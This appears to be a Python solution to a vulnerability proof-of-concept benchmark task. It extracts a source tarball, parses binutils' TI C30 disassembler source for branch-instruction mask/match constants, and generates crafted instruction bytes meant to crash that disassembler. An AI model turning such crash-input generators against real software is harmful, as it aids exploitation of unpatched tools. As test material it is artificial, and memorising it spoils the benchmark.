import os
import re
import tarfile
import tempfile
import struct
import random

class Solution:
    def solve(self, src_path: str) -> bytes:
        random.seed(0)

        def extract_tarball(path, outdir):
            try:
                with tarfile.open(path) as tf:
                    tf.extractall(outdir)
                return True
            except Exception:
                return False

        def find_file(root, filename):
            for dirpath, _, filenames in os.walk(root):
                if filename in filenames:
                    return os.path.join(dirpath, filename)
            return None

        def read_text(path):
            try:
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    return f.read()
            except Exception:
                return ""

        def parse_pairs_from_table(text):
            pairs = set()
            # Match struct initializer entries containing print_branch
            for m in re.finditer(r'\{[^{}]*?print_branch[^{}]*?\}', text, re.S):
                entry = m.group(0)
                hexes = [int(h, 16) for h in re.findall(r'0x[0-9a-fA-F]+', entry)]
                # Try adjacent pairs among first few numbers to catch mask/match
                for i in range(max(0, len(hexes) - 6)):  # limit overrun
                    pass
                # Try all combinations among first up to 6 nums
                for i in range(min(6, len(hexes))):
                    for j in range(min(6, len(hexes))):
                        if i == j:
                            continue
                        a = hexes[i] & 0xFFFFFFFF
                        b = hexes[j] & 0xFFFFFFFF
                        # Heuristics: if (match & mask) == match
                        if (b & a) == b:
                            mask, match = a, b
                            pairs.add((mask, match))
                        if (a & b) == a:
                            mask, match = b, a
                            pairs.add((mask, match))
            return list(pairs)

        def parse_pairs_from_ifs(text):
            pairs = set()
            # if ((var & mask) == match) ... print_branch
            pattern = re.compile(
                r'if\s*\(\s*\(\s*([A-Za-z_]\w*)\s*&\s*(0x[0-9a-fA-F]+)\s*\)\s*==\s*(0x[0-9a-fA-F]+)\s*\)\s*[^;{]*?(?:\{[^{}]*?print_branch[^{}]*?\}|print_branch\s*\()',
                re.S
            )
            for m in pattern.finditer(text):
                mask = int(m.group(2), 16) & 0xFFFFFFFF
                match = int(m.group(3), 16) & 0xFFFFFFFF
                pairs.add((mask, match))
            return list(pairs)

        def extract_function_body(text, fname):
            # Find 'fname(' and then matching '{' ... '}'
            m = re.search(r'\b' + re.escape(fname) + r'\s*\(', text)
            if not m:
                return ""
            start = m.end()  # after '('
            # Find close parenthesis of function signature
            depth = 1
            i = start
            while i < len(text) and depth > 0:
                c = text[i]
                if c == '(':
                    depth += 1
                elif c == ')':
                    depth -= 1
                i += 1
            if depth != 0:
                return ""
            # At i is just after the ')', find next '{'
            while i < len(text) and text[i] not in '{':
                i += 1
            if i >= len(text) or text[i] != '{':
                return ""
            # Now match braces
            brace_start = i
            depth = 0
            j = brace_start
            in_str = None
            while j < len(text):
                c = text[j]
                if in_str:
                    if c == '\\':
                        j += 2
                        continue
                    if c == in_str:
                        in_str = None
                else:
                    if c == '"' or c == "'":
                        in_str = c
                    elif c == '{':
                        depth += 1
                    elif c == '}':
                        depth -= 1
                        if depth == 0:
                            # include final brace
                            j += 1
                            return text[brace_start:j]
                j += 1
            return ""

        def parse_bitfields_in_body(body):
            fields = set()
            # Try common var names that might represent the instruction word
            varnames = set(['insn', 'iword', 'word', 'opcode', 'op', 'inst', 'instruction', 'insn_word'])
            # Also include any identifier that is shifted and masked repeatedly - heuristics
            candidates = set(re.findall(r'\b([A-Za-z_]\w*)\s*>>\s*\d+', body))
            # Keep only plausible short names
            for name in candidates:
                if len(name) <= 12:
                    varnames.add(name)

            # Patterns like: (var >> shift) & mask    or var >> shift & mask
            for v in varnames:
                # Surround optional parentheses
                pat1 = re.compile(r'\(\s*' + re.escape(v) + r'\s*>>\s*(\d+)\s*\)\s*&\s*(0x[0-9a-fA-F]+|\d+)')
                pat2 = re.compile(r'\b' + re.escape(v) + r'\s*>>\s*(\d+)\s*&\s*(0x[0-9a-fA-F]+|\d+)')
                for pat in (pat1, pat2):
                    for m in pat.finditer(body):
                        shift = int(m.group(1))
                        mask_s = m.group(2)
                        try:
                            if mask_s.lower().startswith('0x'):
                                maskv = int(mask_s, 16)
                            else:
                                maskv = int(mask_s)
                        except Exception:
                            continue
                        if 0 <= shift < 32 and 0 < maskv < (1 << 32):
                            fields.add((shift, maskv & 0xFFFFFFFF))
            # Return as list sorted by mask bit-width descending (try wider fields first)
            fields = list(fields)
            fields.sort(key=lambda x: bin(x[1]).count('1'), reverse=True)
            # Limit to a reasonable number of fields (to keep payload small/targeted)
            if len(fields) > 16:
                fields = fields[:16]
            return fields

        def build_instrs_for_pair(mask, match, fields, max_count=128):
            instrs = []
            mask &= 0xFFFFFFFF
            match &= 0xFFFFFFFF
            # Ensure canonical match: match bits within mask only
            match &= mask
            freeMask = (~mask) & 0xFFFFFFFF

            def add(i):
                i &= 0xFFFFFFFF
                # Keep property (i & mask) == match
                i = (i & freeMask) | match
                instrs.append(i)

            # Base
            add(match)

            # Set all fields to max in free bits
            bits = 0
            for shift, mval in fields:
                bits |= ((mval << shift) & freeMask)
            add(match | bits)

            # Individual fields set to max
            for shift, mval in fields:
                add(match | ((mval << shift) & freeMask))

            # Combine top 4 fields pairwise
            top = fields[:4]
            for a in range(len(top)):
                for b in range(a + 1, len(top)):
                    shift_a, mval_a = top[a]
                    shift_b, mval_b = top[b]
                    add(match | (((mval_a << shift_a) | (mval_b << shift_b)) & freeMask))

            # Random variations
            rand_needed = max_count - len(instrs)
            for _ in range(max(0, rand_needed)):
                rb = random.getrandbits(32) & freeMask
                add(match | rb)

            # Dedup while preserving order
            seen = set()
            uniq = []
            for i in instrs:
                if i not in seen:
                    uniq.append(i)
                    seen.add(i)
            # Limit to max_count
            return uniq[:max_count]

        # Begin processing
        with tempfile.TemporaryDirectory() as tmpdir:
            ok = extract_tarball(src_path, tmpdir)
            if not ok:
                # Fallback minimal payload
                return b'\x00' * 10
            tic30_path = find_file(tmpdir, 'tic30-dis.c')
            if tic30_path is None:
                # Fallback minimal payload
                return b'\x00' * 10

            text = read_text(tic30_path)
            pairs = []
            pairs.extend(parse_pairs_from_table(text))
            # Add from if patterns as well
            pairs.extend(parse_pairs_from_ifs(text))
            # Deduplicate pairs
            seen_pairs = set()
            final_pairs = []
            for p in pairs:
                if p not in seen_pairs:
                    seen_pairs.add(p)
                    final_pairs.append(p)

            # If no pairs found, fallback
            if not final_pairs:
                # Try to craft something that looks like a branch by heuristic: any mask/match in file
                # Search for hex constants of 32-bit with top bits non-zero - pick a few
                hexes = [int(h, 16) & 0xFFFFFFFF for h in re.findall(r'0x[0-9a-fA-F]{6,8}', text)]
                payload = bytearray()
                for val in hexes[:8]:
                    payload += val.to_bytes(4, 'big') + b'\x00' * 6
                    payload += val.to_bytes(4, 'little') + b'\x00' * 6
                if not payload:
                    payload = bytearray(b'\x00' * 10)
                return bytes(payload)

            body = extract_function_body(text, 'print_branch')
            fields = parse_bitfields_in_body(body) if body else []

            # Build payload
            max_total_bytes = 65536  # 64 KB cap
            filler_patterns = [b'\x00' * 6, b'\xff' * 6, b'\x00\xff\x00\xff\x00\xff']
            payload = bytearray()
            emitted = 0

            # Shuffle pairs to diversify early coverage
            random.shuffle(final_pairs)

            for (mask, match) in final_pairs:
                instrs = build_instrs_for_pair(mask, match, fields, max_count=96)
                # For each instr, add both BE and LE versions with filler
                for inst in instrs:
                    if emitted >= max_total_bytes:
                        break
                    filler = random.choice(filler_patterns)
                    block_be = inst.to_bytes(4, 'big') + filler
                    block_le = inst.to_bytes(4, 'little') + filler
                    # Append both blocks, but ensure not to exceed max
                    if emitted + len(block_be) <= max_total_bytes:
                        payload += block_be
                        emitted += len(block_be)
                    if emitted + len(block_le) <= max_total_bytes:
                        payload += block_le
                        emitted += len(block_le)
                if emitted >= max_total_bytes:
                    break

            # Ensure at least some data
            if not payload:
                payload = bytearray(b'\x00' * 10)

            return bytes(payload)